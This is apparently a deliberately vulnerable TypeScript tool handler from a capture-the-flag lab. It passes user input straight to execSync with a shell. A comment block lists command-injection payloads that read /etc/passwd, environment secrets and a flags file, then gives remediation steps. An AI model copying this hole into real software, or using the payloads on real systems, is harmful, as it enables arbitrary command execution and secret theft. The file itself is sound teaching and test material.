/**
 * Command Executor Tool - Command Injection Vulnerability
 *
 * ⚠️  VULNERABILITY: OS Command Injection (CWE-78)
 * This tool executes system commands without proper input sanitization.
 * Attackers can inject shell metacharacters to execute arbitrary commands.
 *
 * EDUCATIONAL PURPOSE: Demonstrates the dangers of unsanitized command execution.
 */

import { execSync } from 'child_process';

export const executeCommandTool = {
  name: 'execute_system_command',
  description: 'Executes system commands on the server. Useful for file operations, process management, and system administration.',
  inputSchema: {
    type: 'object',
    properties: {
      command: {
        type: 'string',
        description: 'The system command to execute (e.g., "ls -la", "whoami", "pwd")',
      },
    },
    required: ['command'],
  },
};

export async function handleExecuteCommand(args: any) {
  const { command } = args;

  try {
    // VULNERABILITY: Direct command execution without sanitization!
    // Should use parameterized commands or allowlist of safe commands
    // Should NEVER concatenate user input into shell commands

    // WRONG: Directly executing user-provided command
    const output = execSync(command, {
      encoding: 'utf-8',
      // VULNERABILITY: Using shell enables injection attacks
      shell: true,  // Should use shell: false with proper argument array
      // VULNERABILITY: No timeout
      timeout: 60000,  // Way too long!
      // VULNERABILITY: Inherits environment (contains FLAG!)
      env: process.env,
    });

    return {
      content: [
        {
          type: 'text',
          text: `Command executed successfully!\n\nCommand: ${command}\n\nOutput:\n${output}`,
        },
      ],
    };
  } catch (error: any) {
    // VULNERABILITY: Error output may contain sensitive info
    return {
      content: [
        {
          type: 'text',
          text: `Command execution failed!\n\nCommand: ${command}\n\nError: ${error.message}\n\nStderr: ${error.stderr}\n\nExit code: ${error.status}`,
        },
      ],
      isError: true,
    };
  }
}

/*
EXPLOITATION EXAMPLES:

1. Command chaining with semicolon:
   command: "ls; cat /etc/passwd"
   command: "pwd; env | grep FLAG"

2. Command chaining with AND:
   command: "whoami && cat /data/secrets/flags.txt"

3. Command chaining with OR:
   command: "false || echo FLAG{test}"

4. Command substitution:
   command: "echo $(cat /data/secrets/flags.txt)"
   command: "ls `cat /etc/passwd`"

5. Pipe to other commands:
   command: "env | grep FLAG"
   command: "cat /etc/passwd | base64"

6. Background execution:
   command: "sleep 100 &"

7. Output redirection:
   command: "cat /data/secrets/flags.txt > /tmp/exfil.txt"

8. CTF Flag extraction:
   command: "env | grep FLAG_COMMAND_INJECTION"
   Expected: FLAG{command_injection_win}

SHELL METACHARACTERS TO TEST:
; & | && || > >> < $ ` \ " ' ! # * ? [ ] { } ( ) ~

REMEDIATION:
- Use child_process.spawn() with argument array (not string)
- Set shell: false
- Use allowlist of permitted commands
- Validate all input against strict patterns
- Run with minimal privileges
- Use parameterized APIs instead of shell commands
- Never concatenate user input into commands
*/
